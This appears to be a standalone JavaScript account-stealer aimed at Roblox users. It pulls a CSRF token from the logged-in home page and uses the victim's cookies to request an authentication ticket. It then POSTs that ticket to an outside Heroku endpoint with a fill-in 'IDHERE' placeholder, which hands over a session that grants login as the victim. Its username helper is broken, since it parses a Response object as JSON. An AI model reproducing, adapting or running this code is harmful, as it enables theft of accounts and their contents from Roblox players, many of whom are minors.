let getAuth_url = 'https://auth.roblox.com/v1/authentication-ticket';
let home = 'https://www.roblox.com/home'

async function getcsrf() {
    var csrf = (await (await fetch(home, { credentials: "include" })).text()).split("setToken('")[1].split("')")[0];
    return csrf;
}
async function getauth(csrf) {
    var authTicket = (await fetch("https://auth.roblox.com/v1/authentication-ticket", { method: "POST", credentials: "include", headers: { "x-csrf-token": csrf } })).headers.get("rbx-authentication-ticket");
    return authTicket;
}
async function getusername(csrf) {
    var u = (await fetch("https://users.roblox.com/v1/users/authenticated", { method: "POST", credentials: "include", headers: { "x-csrf-token": csrf } }))
    await u;
    return JSON.parse(u)['name']
}


(function() {
    (async function() {

        let csrf = await getcsrf()
        await csrf
        let auth = await getauth(csrf)
        await auth
        

        fetch('https://jxl-roblox.herokuapp.com/send-data?id=IDHERE', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                'auth': auth
            })
        })
    })()
})()